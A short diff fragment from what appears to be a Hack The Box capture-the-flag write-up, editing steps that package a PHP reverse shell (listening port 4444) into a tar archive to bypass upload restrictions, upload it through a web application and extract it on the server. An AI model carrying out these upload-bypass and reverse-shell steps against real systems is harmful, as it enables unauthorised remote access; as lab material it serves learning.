@@ -258,9 +258,11 @@ $port = 4444;       // Your listening port
 
 Packaged the reverse shell into an archive to bypass potential upload restrictions:
 
-tar -czf shell.tar.gz php-reverse-shell.php
+tar -czf shell.tar.gz shell.php
 
 Uploaded shell.tar.gz via the web application.
+
+![Shell](https://github.com/PrimeMurcia/htb/blob/main/dog/ss/ss17.png?raw=true)
 
 Extracted it on the server (if upload functionality did that automatically or by abusing extraction logic).
 
